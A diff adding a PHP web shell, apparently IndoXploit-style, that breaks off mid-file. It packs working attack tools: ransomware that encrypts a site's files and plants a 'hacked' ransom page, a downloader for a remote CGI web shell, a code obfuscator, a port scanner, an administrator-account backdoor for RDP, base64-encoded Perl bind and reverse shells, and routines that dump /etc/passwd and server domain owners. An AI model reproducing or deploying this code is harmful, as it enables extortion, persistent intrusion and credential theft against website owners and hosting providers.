@@ -1,0 +1,2122 @@
+<?php
+session_start();
+error_reporting(0);
+set_time_limit(0);
+
+// Randomize User-Agent to simulate different browsers
+$userAgents = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1'
+];
+$randomUserAgent = $userAgents[array_rand($userAgents)];
+
+header('X-LiteSpeed-Cache-Control: no-cache');
+header('Access-Control-Allow-Origin: *');
+header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
+header('Access-Control-Allow-Headers: Content-Type');
+header('User-Agent: ' . $randomUserAgent);
+
+$csS = __FILE__;
+$iv = openssl_random_pseudo_bytes(16);
+$path = dirname(__FILE__);
+
+// Deface script for WordPress
+function encpage(){
+    $html = <<<HTML
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Hacked</title>
+</head>
+<body>
+    <h1>Your site has been hacked!</h1>
+    <p>Contact us to recover your site.</p>
+</body>
+</html>
+HTML;
+    return $html;
+}
+
+// Encryption function
+function encryptData($dt, $ky, $iv) {
+    $ci = 'AES-256-CBC';
+    $op = 0;
+    $salt = openssl_random_pseudo_bytes(16);
+    $ed = openssl_encrypt($dt, $ci, $ky, $op, $iv);
+    
+    if ($ed === false) {
+        return false;
+    }
+    
+    $ed_base64 = base64_encode($iv . $salt . $ed);
+    return strtr($ed_base64, '+/=', '-_,');
+}
+
+// Decryption function
+function decryptData($dt, $ky) {
+    $ci = 'AES-256-CBC';
+    $op = 0;
+    
+    $cd = base64_decode(strtr($dt, '-_,', '+/='));
+    $iv = substr($cd, 0, 16);
+    $salt = substr($cd, 16, 16); 
+    $df = substr($cd, 32); 
+    $dd = openssl_decrypt($df, $ci, $ky, $op, $iv);
+    
+    if ($dd === false) {
+        return false;
+    }
+    
+    return $dd;
+}
+
+// Function to process ransomware
+function ransomware() {
+    global $iv;
+    ob_start();
+    $cf = $_SERVER['DOCUMENT_ROOT'] . $_SERVER['PHP_SELF'];
+    $dirs = getDirectoryList();
+    
+    echo "
+    <h1>Ransomware</h1>
+    <form method=\"post\" action=\"\">
+        <table>
+            <tr>
+                <td>Script:</td>
+                <td><textarea name=\"st\" style=\"width:300px;height:100px;\">";
+    echo encpage();
+                
+    echo "</textarea></td>
+            </tr>
+            <tr>
+                <td>Select Directory:</td>
+                <td><select name=\"dir[]\" multiple>";
+    
+    foreach ($dirs as $dir) {
+        echo "<option value=\"$dir\">$dir</option>";
+    }
+    
+    echo "</select></td>
+            </tr>
+            <tr>
+                <td>Key:</td>
+                <td><input type=\"text\" name=\"rk\" placeholder=\"Key\" required></td>
+            </tr>
+            <tr>
+                <td>Filename suffix:</td>
+                <td><input type=\"text\" name=\"fs\" placeholder=\"e.g. abcdef\" required></td>
+            </tr>
+            <tr>
+                <td></td>
+                <td><button>Submit</button></td>
+            </tr>
+        </table>
+    </form>
+    ";
+
+    if (isset($_POST['rk']) && isset($_POST['dir'])) {
+        if (!empty($_POST['rk'])) {
+            $rk = $_POST['rk'];
+            $fsx = empty($_POST['fs']) ? "enc" : $_POST['fs'];
+            $stf = empty($_POST['st']) ? encpage() : $_POST['st'];
+            $selected_dirs = $_POST['dir'];
+            echo "<b>Key:</b> ".htmlentities($rk)."<br><b>Filename suffix:</b> ".htmlentities($fsx)."<br><br>";
+            if (flt($fsx)) {
+                foreach ($selected_dirs as $path) {
+                    processDirectory($path, $rk, $fsx, $stf, $cf, $iv);
+                }
+            } else {
+                echo "<br><b>Error:</b> \"Filename\" contains special characters<br>";
+            }
+        } else {
+            echo "<br><b>Error:</b> \"Key\" cannot be empty<br>";
+        }
+    }
+    ob_end_flush();
+}
+
+// Decrypt ransomware
+function decransomware() {
+    global $iv;
+    ob_start();
+    $cf = $_SERVER['DOCUMENT_ROOT'] . $_SERVER['PHP_SELF'];
+    $dirs = getDirectoryList();
+
+    echo "
+    <h1>Ransomware Decryption</h1>
+    <form method=\"post\" action=\"\">
+        <table>
+            <tr>
+                <td>Select Directory:</td>
+                <td><select name=\"dir[]\" multiple>";
+    
+    foreach ($dirs as $dir) {
+        echo "<option value=\"$dir\">$dir</option>";
+    }
+    
+    echo "</select></td>
+            </tr>
+            <tr>
+                <td>Key:</td>
+                <td><input type=\"text\" name=\"rk\" placeholder=\"Key\" required></td>
+            </tr>
+            <tr>
+                <td></td>
+                <td><button>Submit</button></td>
+            </tr>
+        </table>
+    </form>
+    ";
+
+    if (isset($_POST['rk']) && isset($_POST['dir'])) {
+        if (!empty($_POST['rk'])) {
+            $rk = $_POST['rk'];
+            $selected_dirs = $_POST['dir'];
+            echo "<b>Key:</b> " . htmlentities($rk) . "<br><br>";
+
+            foreach ($selected_dirs as $path) {
+                decryptDirectory($path, $rk, $cf, $iv);
+            }
+        } else {
+            echo "<br><b>Error:</b> \"Key\" cannot be empty<br>";
+        }
+    }
+    ob_end_flush();
+}
+
+// Get list of directories
+function getDirectoryList() {
+    $dirs = [];
+    $root = $_SERVER['DOCUMENT_ROOT'];
+    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root), RecursiveIteratorIterator::SELF_FIRST);
+    foreach ($iterator as $item) {
+        if ($item->isDir()) {
+            $dirs[] = $item->getRealPath();
+        }
+    }
+    return $dirs;
+}
+
+// Process directory for encryption
+function processDirectory($path, $rk, $fsx, $stf, $cf, $iv){
+    $fs = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path), RecursiveIteratorIterator::LEAVES_ONLY);
+    
+    foreach ($fs as $fn) {
+        if ($fn != $cf && !$fn->isDir()) { 
+            $nfl = generateRandomFilename($fn, $fsx);
+            $gf = curlGetContents($fn); 
+            $metadata = json_encode([
+                'original_name' => basename($fn),
+                'original_path' => dirname($fn)
+            ]);
+            $data = $metadata . "\n" . $gf;
+            $enc = encryptData($data, $rk, $iv);
+            if ($enc !== false) {
+                file_put_contents($fn, $enc);
+                rename($fn, $nfl);
+            }
+        }
+    }
+
+    $indexFilePath = "$path/index.php";
+    if (!file_exists($indexFilePath) || strpos(curlGetContents($indexFilePath), 'Your site has been hacked!') === false) {
+        file_put_contents($indexFilePath, $stf);
+    }
+}
+
+// Decrypt directory
+function decryptDirectory($path, $rk, $cf, $iv){
+    $fs = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path), RecursiveIteratorIterator::LEAVES_ONLY);
+    foreach ($fs as $fn) {
+        if ($fn != $cf && !empty($fn) && !is_dir($fn)) {
+            $gf = curlGetContents($fn);
+            $dec = decryptData($gf, $rk);
+            if ($dec !== false) {
+                $dec_lines = explode("\n", $dec, 2);
+                $metadata = json_decode($dec_lines[0], true);
+                $file_data = $dec_lines[1];
+                $original_fullpath = $metadata['original_path'] . "/" . $metadata['original_name'];
+                file_put_contents($original_fullpath, $file_data);
+                unlink($fn);
+            }
+        }
+    }
+    $indexFilePath = "$path/index.php";
+    if (file_exists($indexFilePath) && strpos(curlGetContents($indexFilePath), 'Your site has been hacked!') !== false) {
+        unlink($indexFilePath);
+    }
+}
+
+// Generate random filename
+function generateRandomFilename($originalPath, $suffix) {
+    $pathInfo = pathinfo($originalPath);
+    $randomName = bin2hex(random_bytes(8));
+    return $pathInfo['dirname'] . '/' . $randomName . '.' . $pathInfo['extension'] . '.' . $suffix;
+}
+
+// Validate filename
+function flt($v) {
+    return preg_match('/^[a-zA-Z0-9]+$/', $v);
+}
+
+// Replaced file_get_contents with curl using multiple strategies
+function curlGetContents($url) {
+    if (is_file($url)) {
+        return file_get_contents($url);
+    }
+
+    $maxAttempts = 5;
+    $attempt = 0;
+    $data = false;
+    
+    // Randomized user agents
+    $userAgents = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
+        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
+        'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1'
+    ];
+
+    do {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // For HTTPS
+        curl_setopt($ch, CURLOPT_TIMEOUT, 30); // Set timeout for bypass
+        
+        // Set random user agent and headers
+        $randomUserAgent = $userAgents[array_rand($userAgents)];
+        curl_setopt($ch, CURLOPT_HTTPHEADER, [
+            'User-Agent: ' . $randomUserAgent, 
+            'Referer: https://www.google.com', 
+            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Connection: keep-alive'
+        ]);
+        
+        $data = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        
+        if ($httpCode == 403) {
+            // Retry logic if 403 is encountered
+            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
+            $data = curl_exec($ch);
+        }
+
+        curl_close($ch);
+        $attempt++;
+
+    } while ($httpCode == 403 && $attempt < $maxAttempts);
+
+    return $data;
+}
+ 
+
+function pi_o(){
+	global $csS;
+	echo "<br><br>
+				<div style=\"margin: 0;
+		    padding: 0;
+		    display: flex;
+		    justify-content: center;
+		    align-items: center;
+		    height: 100vh;\">
+					<iframe style=\"width:100%;height:100%;border:0px;\" src=\"".basename($csS)."?phpinfos\"></iframe>
+				</div>
+	<br>";
+}
+
+function gs($url) {
+    $curl = curl_init($url);
+    		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+    		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
+    		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+    		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
+    		curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.22 Safari/537.36");
+    $content = curl_exec($curl);
+    		curl_close($curl);
+    return $content;
+}
+
+function dcg(){
+	$cgi_dir = mkdir('idx_cgi', 0755);
+	$file_cgi = "idx_cgi/cgi.izo";
+	$isi_htcgi = "AddHandler cgi-script .izo";
+	$htcgi = fopen(".htaccess", "w");
+	fwrite($htcgi, $isi_htcgi);
+	fclose($htcgi);
+	$cgi_script = gs("https://raw.githubusercontent.com/pansysecurity/CGI-WebShell/main/cgiwebshell.pl");
+	$cgi = fopen($file_cgi, "w");
+	fwrite($cgi, $cgi_script);
+	fclose($cgi);
+	chmod($file_cgi, 0755);
+	echo "<iframe src='idx_cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
+}
+
+function dwasr(){
+	print "
+	<h1>Whois / AS Info / Reverse IP</h1>
+	<form method=\"post\" action=\"\" style=\"margin-top:20px;\">
+		<input type=\"text\" name=\"host\" placeholder=\"Host\">
+		<button>Submit</button>
+	</form>";
+	
+	if(isset($_POST['host'])){
+		$gw = gs("http://networktools.nl/whois/{$_POST['host']}");
+		preg_match_all("/<pre>(.*?)<\/pre>/s",$gw,$fw);
+		print "<br><h2>Whois:</h2>{$fw[0][0]}";
+		
+		$ga = gs("http://networktools.nl/asinfo/{$_POST['host']}");
+		preg_match_all("/<pre>(.*?)<\/pre>/s",$ga,$fa);
+		print "<br><h2>AS Info:</h2>{$fa[0][0]}";
+		
+		$gr = gs("http://networktools.nl/reverseip/{$_POST['host']}");
+		preg_match_all("/<pre>(.*?)<\/pre>/s",$gr,$fr);
+		print "<br><h2>Reverse IP:</h2>{$fr[0][0]}";
+	}
+}
+
+function ro($c,$l){
+	if($l == 2){
+		$cb = "ZXZhbCUyOCUyNyUzRiUyNmd0JTNCJTI3Lmd6dW5jb21wcmVzcyUyOGd6aW5mbGF0ZSUyOGd6aW5mbGF0ZSUyOGJhc2U2NF9kZWNvZGUlMjhzdHJyZXYlMjglMjRDcmltZSUyOSUyOSUyOSUyOSUyOSUyOSUzQg";
+	}elseif($l == 3){
+		$cb = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNENyaW1lJTI5JTI5JTI5JTI5JTI5JTI5JTI5JTI5JTNC";
+	}else{
+		$cb = "ZXZhbCUyOCUyNyUzRiUyNmd0JTNCJTI3Lmd6dW5jb21wcmVzcyUyOGd6aW5mbGF0ZSUyOGJhc2U2NF9kZWNvZGUlMjhzdHJyZXYlMjglMjRDcmltZSUyOSUyOSUyOSUyOSUyOSUzQg";
+	}
+		
+	$fc = "<?php \$cb=\"$cb\";\$Crime=\"$c\";eval(htmlspecialchars_decode(urldecode(base64_decode(\$cb))));exit; ?>";
+	return $fc;
+}
+
+function ofc($c,$l) {
+	if ($l == 2) {
+		$fc = ro(strrev(base64_encode(gzdeflate(gzdeflate(gzcompress($c))))),$l);
+	}elseif ($l == 3) {
+		$fc = ro(strrev(base64_encode(gzdeflate(gzdeflate(gzdeflate(gzcompress(gzcompress($c))))))),$l);
+	}else{
+		$fc = ro(strrev(base64_encode(gzdeflate(gzcompress($c)))),$l);
+	}
+
+    return $fc;
+}
+
+function obc(){
+	$dc = isset($_POST['code']) ? htmlentities($_POST['code']) : "";
+	print "<h1>Obfuscator</h1>
+	<form method=\"post\" action=\"\" style=\"margin-top:20px;\">
+		<textarea name=\"code\" placeholder=\"PHP code\" style=\"width:100%;height:300px;\">$dc</textarea>
+		<br>
+		Obfuscate level: 
+		<select name=\"lvl\" style=\"width: 200px;\">
+			<option value=\"1\">Level 1</option>
+			<option value=\"2\">Level 2</option>
+			<option value=\"3\">Level 3</option>
+		</select>
+		<button>Submit</button>
+	</form>";
+	if(isset($_POST['code']) && isset($_POST['lvl'])){
+		$ocd = ofc($_POST['code'],$_POST['lvl']);
+		print "<br><h3>Hasil:</h3><textarea style=\"width:100%;height:300px;\">$ocd</textarea>";
+	}
+}
+
+function ps(){
+	ob_start();
+	print "<h1>Port scanner</h1>
+	<form method=\"post\" action=\"\" style=\"margin-top:20px;\">
+		Host:<br>
+		<input name=\"hs\" style=\"width: 200px;\" placeholder=\"host\"><br>
+		Port start:<br>
+		<input name=\"ps\" style=\"width: 200px;\" placeholder=\"port start\" value=\"0\"><br>
+		Port end:<br>
+		<input name=\"pe\" style=\"width: 200px;\" placeholder=\"port end\" value=\"8443\"><br>
+		<button>Submit</button>
+	</form>";
+	if(isset($_POST['hs']) && is_numeric($_POST['ps']) && is_numeric($_POST['pe'])){
+		$h = strip_tags($_POST['hs']);
+		$s = strip_tags($_POST['ps']);
+		$e = strip_tags($_POST['pe']);
+		for($i=$s; $i<=$e; $i++){
+			$psf = @fsockopen($h, $i, $errno, $errstr, 1);
+			if(is_resource($psf)){
+				fclose($psf);
+				echo "Host: $h ; Port : $i ; Status : <span style=\"color:#00ff0f;\">open</span><br>";
+			}else{
+				echo "Host: $h ; Port : $i ; Status : <span style=\"color:red;\">not open</span><br>";
+			}
+			flush();
+		}
+	}
+	ob_end_flush();
+}
+
+function fr(){
+	$gc = getcwd();
+	$gs = explode("/", $gc);
+	$cs = $gs[2];
+	print "<h1>Fake root scanner</h1>
+	<form method=\"post\" action=\"\" style=\"margin-top:20px;\">
+		File name:
+		<br>
+		<input name=\"fn\" style=\"width: 200px;\" placeholder=\"deface.html\">
+		<br>
+		User:
+		<br>
+		<input name=\"us\" style=\"width: 200px;\" value=\"$cs\" readonly>
+		<br>
+		Domain:
+		<br>
+		<textarea name=\"hs\" placeholder=\"host\" style=\"width:100%;height:300px;\"></textarea>
+		<br>
+		<button>Scan Fake Root</button>
+	</form>";
+	if(isset($_POST['fn']) && isset($_POST['hs'])){
+		$s = explode("\r\n", $_POST['hs']);
+		$f = $_POST['fn'];
+		foreach($s as $u){
+			$c = gs("$u/~$cs/$f");
+			if(preg_match("/hack|deface|h4ck/i", strtolower($c))) {
+				echo "URL: <a href='$u/~$cs/$f' target='_blank'>$u/~$cs/$f</a> -> <font color=lime>Fake Root!</font><br>";
+			}
+		}
+	}
+}
+
+function fcsrf(){
+	print "<h1>CSRF Exploit</h1>
+		<p>Parameter: image/images,filedata,dzupload,dzfile,dzfiles,file/files,ajaxfup,file[]/files[],qqfile,userfile,etc</p>
+		URL Endpoint:
+		<br>
+		<input id=\"tg\" style=\"width: 200px;\" placeholder=\"https://target.com\">
+		<br>
+		User:
+		<br>
+		<input id=\"pm\" style=\"width: 200px;\" placeholder=\"image / file / etc\">
+		<br>
+		<button onclick=\"bcsrf()\">Submit</button>
+		<div id=\"fcsrf\"></div>
+		<script>
+		function bcsrf(){
+			fcsrf = document.getElementById('fcsrf');
+			tg = document.getElementById('tg').value;
+			pm = document.getElementById('pm').value;
+			
+			fcsrf.innerHTML = '<h2>Target locked</h2><b>URL:</b> '+tg+'<br><b>Parameter:</b> '+pm+'<br><form method=\"post\" target=\"_blank\" action=\"'+tg+'\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"'+pm+'\"><button>Submit</button></form>';
+		}
+		</script>
+	";
+}
+
+function krdp(){
+	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
+		if($_POST['create']) {
+			$user = htmlspecialchars($_POST['user']);
+			$pass = htmlspecialchars($_POST['pass']);
+			if(preg_match("/$user/", exe("net user"))) {
+				echo "[INFO] -> <font color=red>user <font color=lime>$user</font> sudah ada</font>";
+			} else {
+				$add_user   = exe("net user $user $pass /add");
+    			$add_groups1 = exe("net localgroup Administrators $user /add");
+    			$add_groups2 = exe("net localgroup Administrator $user /add");
+    			$add_groups3 = exe("net localgroup Administrateur $user /add");
+    			echo "[ RDP ACCOUNT INFO ]<br>
+    			------------------------------<br>
+    			IP: <font color=lime>".$ip."</font><br>
+    			Username: <font color=lime>$user</font><br>
+    			Password: <font color=lime>$pass</font><br>
+    			------------------------------<br><br>
+    			[ STATUS ]<br>
+    			------------------------------<br>
+    			";
+    			if($add_user) {
+    				echo "[add user] -> <font color='lime'>Berhasil</font><br>";
+    			} else {
+    				echo "[add user] -> <font color='red'>Gagal</font><br>";
+    			}
+    			if($add_groups1) {
+        			echo "[add localgroup Administrators] -> <font color='lime'>Berhasil</font><br>";
+    			} elseif($add_groups2) {
+        		    echo "[add localgroup Administrator] -> <font color='lime'>Berhasil</font><br>";
+    			} elseif($add_groups3) { 
+        		    echo "[add localgroup Administrateur] -> <font color='lime'>Berhasil</font><br>";
+    			} else {
+    				echo "[add localgroup] -> <font color='red'>Gagal</font><br>";
+    			}
+    			echo "------------------------------<br>";
+			}
+		} elseif($_POST['s_opsi']) {
+			$user = htmlspecialchars($_POST['r_user']);
+			if($_POST['opsi'] == '1') {
+				$cek = exe("net user $user");
+				echo "Checking username <font color=lime>$user</font> ....... ";
+				if(preg_match("/$user/", $cek)) {
+					echo "[ <font color=lime>Sudah ada</font> ]<br>
+					------------------------------<br><br>
+					<pre>$cek</pre>";
+				} else {
+					echo "[ <font color=red>belum ada</font> ]";
+				}
+			} elseif($_POST['opsi'] == '2') {
+				$cek = exe("net user $user indoxploit");
+				if(preg_match("/$user/", exe("net user"))) {
+					echo "[change password: <font color=lime>indoxploit</font>] -> ";
+					if($cek) {
+						echo "<font color=lime>Berhasil</font>";
+					} else {
+						echo "<font color=red>Gagal</font>";
+					}
+				} else {
+					echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
+				}
+			} elseif($_POST['opsi'] == '3') {
+				$cek = exe("net user $user /DELETE");
+				if(preg_match("/$user/", exe("net user"))) {
+					echo "[remove user: <font color=lime>$user</font>] -> ";
+					if($cek) {
+						echo "<font color=lime>Berhasil</font>";
+					} else {
+						echo "<font color=red>Gagal</font>";
+					}
+				} else {
+					echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
+				}
+			} else {
+				//
+			}
+		} else {
+			echo "-- Create RDP --<br>
+			<form method='post'>
+			<input type='text' name='user' placeholder='username' value='indoxploit' required>
+			<input type='text' name='pass' placeholder='password' value='indoxploit' required>
+			<input type='submit' name='create' value='>>'>
+			</form>
+			-- Option --<br>
+			<form method='post'>
+			<input type='text' name='r_user' placeholder='username' required>
+			<select name='opsi'>
+			<option value='1'>Cek Username</option>
+			<option value='2'>Ubah Password</option>
+			<option value='3'>Hapus Username</option>
+			</select>
+			<input type='submit' name='s_opsi' value='>>'>
+			</form>
+			";
+		}
+	} else {
+		echo "<h2 style=color:red>Fitur ini hanya dapat digunakan dalam Windows Server.</h2>";
+	}
+}
+
+function bport(){
+	echo "
+	<h1>Bind Port & Back Connect</h1>
+	<form method='post'>
+	<u>Bind Port:</u> <br>
+	PORT: <input type='text' placeholder='port' name='port_bind' value='6969'>
+	<input type='submit' name='sub_bp' value='>>'>
+	</form>
+	<form method='post'>
+	<u>Back Connect:</u> <br>
+
+	Server: <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'>&nbsp;&nbsp;
+	PORT: <input type='text' placeholder='port' name='port_bc' value='6969'>
+	<input type='submit' name='sub_bc' value='>>'>
+	</form>";
+	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
+	if(isset($_POST['sub_bp'])) {
+		$f_bp = fopen("/tmp/bp.pl", "w");
+		fwrite($f_bp, base64_decode($bind_port_p));
+		fclose($f_bp);
+
+		$port = $_POST['port_bind'];
+		$out = exe("perl /tmp/bp.pl $port 1>/dev/null 2>&1 &");
+		sleep(1);
+		echo "<pre>".$out."\n".exe("ps aux | grep bp.pl")."</pre>";
+		unlink("/tmp/bp.pl");
+	}
+	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
+	if(isset($_POST['sub_bc'])) {
+		$f_bc = fopen("/tmp/bc.pl", "w");
+		fwrite($f_bc, base64_decode($back_connect_p));
+		fclose($f_bc);
+
+		$ipbc = $_POST['ip_bc'];
+		$port = $_POST['port_bc'];
+		$out = exe("perl /tmp/bc.pl $ipbc $port 1>/dev/null 2>&1 &");
+		sleep(1);
+		echo "<pre>".$out."\n".exe("ps aux | grep bc.pl")."</pre>";
+		unlink("/tmp/bc.pl");
+	}
+}
+
+function domvs(){
+	ob_start();
+	echo "<center>
+		<div class='mybox'>
+		<p align='center' class='cgx2'>Domains and Users</p>";
+					$d0mains = @file("/etc/named.conf");
+					if (!$d0mains) {
+						die("<center>Error : can't read [ /etc/named.conf ]</center>");
+					}
+					echo '<table id="output"><tr bgcolor=#cecece><td>Domains</td><td>users</td></tr>';
+					foreach ($d0mains as $d0main) {
+						if (eregi("zone", $d0main)) {
+							preg_match_all('#zone "(.*)"#', $d0main, $domains);
+							flush();
+							if (strlen(trim($domains[1][0])) > 2) {
+								$user = posix_getpwuid(@fileowner("/etc/valiases/" . $domains[1][0]));
+								echo "<tr><td><a href=http://www." . $domains[1][0] . "/>" . $domains[1][0] . "</a></td><td>" . $user['name'] . "</td></tr>";
+								flush();
+							}
+						}
+					}
+					echo '</div></center>';
+	ob_end_flush();
+}
+
+function bpwd(){
+	global $dir;
+	$op = null;
+	echo "
+	<h1>Bypass /etc/passwd</h1>
+	<a class=\"destroy_table\" href=\"?dir=$dir&to=bypasspasswd&bypass=sysf\">System Function</a>
+	<a class=\"destroy_table\" href=\"?dir=$dir&to=bypasspasswd&bypass=pstf\">Passthru Function</a>
+	<a class=\"destroy_table\" href=\"?dir=$dir&to=bypasspasswd&bypass=exec\">Exec Function</a>
+	<a class=\"destroy_table\" href=\"?dir=$dir&to=bypasspasswd&bypass=sxf\">Shell_exec Function</a>
+	<a class=\"destroy_table\" href=\"?dir=$dir&to=bypasspasswd&bypass=psxf\">Posix_getpwuid Function</a>
+	
+	<h1>Bypass User</h1>
+	<a class=\"destroy_table\" href=\"?dir=$dir&to=bypasspasswd&bypass=uawk\">AWK Program</a>
+	<a class=\"destroy_table\" href=\"?dir=$dir&to=bypasspasswd&bypass=usys\">System Function</a>
+	<a class=\"destroy_table\" href=\"?dir=$dir&to=bypasspasswd&bypass=upst\">Passthru Function</a>
+	<a class=\"destroy_table\" href=\"?dir=$dir&to=bypasspasswd&bypass=uexe\">Exec Function</a>
+	<a class=\"destroy_table\" href=\"?dir=$dir&to=bypasspasswd&bypass=usxf\">Shell_exec Function</a>
+	
+	<br><br><br>
+	";
+	if($_GET['bypass'] == "sysf"){
+		echo "<textarea style=\"width:100%;height:300px;\">";
+		echo system("cat /etc/passwd");
+		echo "</textarea>";
+	}elseif($_GET['bypass'] == "pstf"){
+		echo "<textarea style=\"width:100%;height:300px;\">";
+		echo passthru("cat /etc/passwd");
+		echo "</textarea>";
+	}elseif($_GET['bypass'] == "exec"){
+		echo "<textarea style=\"width:100%;height:300px;\">";
+		echo exec("cat /etc/passwd");
+		echo "</textarea>";
+	}elseif($_GET['bypass'] == "sxf"){
+		echo "<textarea style=\"width:100%;height:300px;\">";
+		echo shell_exec("cat /etc/passwd");
+		echo "</textarea>";
+	}elseif($_GET['bypass'] == "psxf"){
+		echo "<textarea style=\"width:100%;height:300px;\">";
+			for ($i = 0; $i < 60000; $i++) {
+				$a = posix_getpwuid($i);
+				if (!empty($a)) {
+					while (list($k, $v) = each($a)) {
+						print "$v:";
+					}
+					print "\n";
+				}
+			}
+		echo "</textarea>";
+	}elseif($_GET['bypass'] == "uawk"){
+		echo "<textarea style=\"width:100%;height:300px;\">";
+		system("awk -F: '{ print $1 }' /etc/passwd | sort");
+		echo "</textarea>";
+	}elseif($_GET['bypass'] == "usys"){
+		echo "<textarea style=\"width:100%;height:300px;\">";
+		echo system("ls /var/mail");
+		echo "</textarea>";
+	}elseif($_GET['bypass'] == "upst"){
+		echo "<textarea style=\"width:100%;height:300px;\">";
+		echo passthru("ls /var/mail");
+		echo "</textarea>";
+	}elseif($_GET['bypass'] == "uexe"){
+		echo "<textarea style=\"width:100%;height:300px;\">";
+		echo exec("ls /var/mail");
+		echo "</textarea>";
+	}elseif($_GET['bypass'] == "usxf"){
+		echo "<textarea style=\"width:100%;height:300px;\">";
+		echo shell_exec("ls /var/mail");
+		echo "</textarea>";
+	}
+
+}
+
+if (!function_exists('posix_getegid')) {
+	$user = @get_current_user();
+	$uid = @getmyuid();
+	$gid = @getmygid();
+	$group = "?";
+} else {
